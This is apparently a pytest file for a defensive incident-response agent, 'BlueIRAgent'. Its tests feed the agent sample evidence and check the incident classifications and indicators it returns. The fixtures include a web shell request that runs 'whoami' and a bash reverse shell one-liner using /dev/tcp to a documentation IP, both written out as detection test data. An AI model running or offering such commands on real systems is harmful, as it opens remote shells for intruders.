import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from blueir_agent.agent import BlueIRAgent
from blueir_agent.tools import analyze_file_bytes


def test_webshell_smoke():
    state = BlueIRAgent().analyze("POST /upload/shell.php?cmd=whoami from 192.0.2.10")
    assert state.findings
    assert state.incident_type == "webshell_or_web_intrusion"
    assert "192.0.2.10" in state.iocs["ipv4"]


def test_linux_ir_smoke():
    state = BlueIRAgent().analyze("2026-05-19 09:06:14 bash -i >& /dev/tcp/203.0.113.77/4444 0>&1")
    assert state.findings
    assert state.incident_type == "linux_ir_triage"
    assert state.timeline


def test_evtx_preanalysis_smoke():
    analysis = analyze_file_bytes("demo.evtx", b"ElfFile\x00\x00\x00EventID=4625 Account=admin SourceNetworkAddress=203.0.113.8")
    state = BlueIRAgent().analyze(
        analysis.text,
        source="demo.evtx",
        evidence_type=analysis.evidence_type,
        evidence_metadata=analysis.metadata,
    )
    assert state.incident_type == "evtx_file_triage"
    assert any(finding.title.startswith("Uploaded EVTX") for finding in state.findings)
